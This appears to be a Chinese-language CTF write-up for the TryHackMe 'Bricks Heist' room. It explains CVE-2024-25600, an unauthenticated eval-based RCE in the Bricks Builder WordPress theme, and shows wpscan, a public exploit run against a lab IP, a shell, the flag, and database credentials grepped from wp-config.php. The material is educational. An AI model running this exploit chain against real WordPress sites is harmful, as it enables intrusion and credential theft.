---
icon: pen-to-square
date: 2025-04-30
tags: 
title: TryHack3M_Bricks Heist
category:
  - 项目
---
## 前言
本题运用了wordpress漏洞[**_CVE-2024-25600_**](https://medium.com/@chinamayjoshi/unauthenticated-remote-code-execution-rce-vulnerability-in-bricks-builder-for-wordpress-a12132c91cc1)
我们可以提前配置wordscan，WPScan 是一款针对 WordPress 的安全扫描工具，用于检测插件、主题漏洞、用户枚举及配置问题。

### 漏洞原理
Bricks <= 1.9.6版本，漏洞为远程代码执行 （RCE），
漏洞存在于Bricks\Query类中，Bricks\Query 类用于管理 WordPress 帖子查询的渲染。
在`Bricks\Query` 类包含的方法`prepare_query_vars_from_settings`中第十行存在eval函数，会处理`$php_query_raw`参数
```php
$user_result = eval( $php_query_raw ); // Execute the user code
```
接下来需要我们找到一种方法来传入`$php_query_raw`参数
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250503124903.png)
发现在多处都实例化了`Bricks\Query`类

在`Bricks\Ajax::render_element($element)`处的实例化尤为显眼
Bricks 使用这个方法来显示编辑器内块/元素的预览。

实例代码：
```php
if ( ! empty( $loop_element ) ) 
	{ $query = new Query( $loop_element ); // CUT FOR BREVITY 
	}
```
该方法可通过`admin-ajax.php` 端点和 `WordPress Rest API` 调用。

以上方方法调用的权限检测如下
```php
if ( bricks_is_ajax_call() && isset( $_POST ) ) {
    self::verify_request();
}

elseif ( bricks_is_rest_call() ) {
    // REST API (Permissions checked in the API->render_element_permissions_check())
}
```
`bricks_is_ajax_call()`分支中会调用`Ajax::verify_request()`，检查当前用户是否有权访问 Bricks 构建器
但是，如果此方法是通过 REST API 调用的，则不会调用`Ajax::verify_request()`。
因为REST API会进行回调检查，
关于`render_element`调用的路由表(注册路径)
```php
// Server-side render (SSR) for builder elements via window.fetch API requests
		register_rest_route(
			self::API_NAMESPACE,
			'render_element',
			[
				'methods'             => 'POST',
				'callback'            => [ $this, 'render_element' ],
				'permission_callback' => [ $this, 'render_element_permissions_check' ],
			]
		); 

```

但在`render_element_permission_check`方法中没有执行任何权限检查，代码略
该方法仅检查请求是否包含有效的`nonce`，`nonce`只能防止重放攻击，并不能进行权限检查


## 解题过程
先用wpscan 扫描一下目标服务器，
```bash
wpscan --url https://bricks.thm/
```
发现存在bricks 且版本为1.9.5，刚好对应了此前的漏洞
于是搜索漏洞会发现许多github项目的exploit，例如
[Chocapikk/CVE-2024-25600：未经身份验证的远程代码执行 – Bricks <= 1.9.6](https://github.com/Chocapikk/CVE-2024-25600)

现在，运行漏洞利用

```shell
C:\Users\l1709\Desktop\work\CVE-2024-25600-main>python exploit.py -u https://10.10.73.131
[*] Nonce found: 4982bac29f
[+] https://10.10.73.131 is vulnerable to CVE-2024-25600. Command output: apache
[!] Shell is ready, please type your commands UwU
```

```bash
# ls
650c844110baced87e1606453b93f22a.txt
index.php
kod
license.txt
phpmyadmin
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php
```

获得隐藏的txt文件
```bash
# cat 650c844110baced87e1606453b93f22a.txt
THM{fl46_650c844110baced87e1606453b93f22a}
```

```bash
# cat wp-config.php | grep DB_
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'root' );
define( 'DB_PASSWORD', 'lamp.sh' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8mb4' );
define( 'DB_COLLATE', '' );
```

